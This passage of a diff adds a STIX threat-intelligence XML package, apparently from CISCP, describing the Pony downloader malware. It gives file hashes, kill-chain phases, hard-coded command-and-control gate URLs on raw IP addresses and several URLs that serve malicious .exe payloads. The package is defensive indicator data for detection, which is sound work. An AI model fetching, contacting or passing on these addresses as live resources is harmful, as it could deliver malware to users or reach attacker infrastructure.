+            <FileObj:Size_In_Bytes condition="Equals">130560</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">5473040da3998ed46be77259ca7115d6</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">1a31b5a284b6b284b9e27d5da91146e88bc7ed6d</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">0aa0c4bcc2bc9b51c31a79a35524a70b5ec733f5515f0bac1c6eed517adc0d4b</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3072:/wQ5yQQUVyvz9QouHg4wB0bHLTTrtCF6:oQ5RKvz9QouHlwBAHLvU</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-04-09T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-2cce9545-4a7e-4b74-9be8-22cc34c11bfa" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>The malware has this URL hard-coded into its execution.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-4de78dbc-0e5a-46a7-966f-199917eca812">
+        <cybox:Object id="CISCP:Object-722feac7-5258-4ee2-89f5-8285550f59c5">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://64.34.70.32:8080/ponyb/gate.php</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-04-09T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-337aabc0-7986-4d2d-9bae-7e491a78f3b5" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>The malware has this URL hard-coded into its execution.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-dd0a87d9-0a95-4efc-8ec6-24d99c0b0171">
+        <cybox:Object id="CISCP:Object-95c852ad-619a-4ca2-bbd5-fefb0630ca4a">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://64.34.70.31:8080/ponyb/gate.php</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-04-09T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-8967a369-e87f-4626-af72-289de2b5866a" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>The malware has this URL hard-coded into its execution.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-e2194e0c-8231-4a09-b89f-512903aa46c8">
+        <cybox:Object id="CISCP:Object-b4283c52-f7b9-40ae-a9b4-594fc8586fd3">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://94.32.66.114/ponyb/gate.php</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-04-09T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-8f83d937-04aa-41fc-9c22-b15a7d9a9be2" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>The malware has this URL hard-coded into its execution. The IP address, 116.122.158.195, has been previously reported in IB-13-10364 as a C2 IP for the Pony downloader malware.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-e92211d4-6740-4379-a973-82ceff63e1e0">
+        <cybox:Object id="CISCP:Object-15463f4c-1523-422f-a1e4-634745791dc4">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://116.122.158.195:8080/ponyb/gate.php</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-04-09T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-4f57e3e7-e125-4ed3-8e12-77a7bb16b903" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>The malware has this URL hard-coded into its execution.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-ee20d64f-fa1d-46bb-ae0b-61712c59689f">
+        <cybox:Object id="CISCP:Object-99a19e70-1d6c-42e8-84af-45182b3807b5">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://www.300dollarwebsites.com/D5cEhB.exe</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-04-09T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-e34e4ce0-730e-4b91-9863-01295194ea8d" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>The malware has this URL hard-coded into its execution.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-cbcdf405-4e69-4c22-9766-a2db0c90c85a">
+        <cybox:Object id="CISCP:Object-1fb87a4c-d11a-459a-90e6-e61074413d41">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://ecoastsystems.com/FAomC.exe</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-04-09T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-90cc2ce2-75c4-40a6-a01b-5d15d67071d8" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>The malware has this URL hard-coded into its execution.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-16afe411-06c2-47e0-bdd2-824330338db8">
+        <cybox:Object id="CISCP:Object-a0f0edb1-9d39-440c-b7c5-1fad8fd7dd4f">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://158909.webhosting61.1blu.de/MS2LLnfS.exe</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-04-09T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
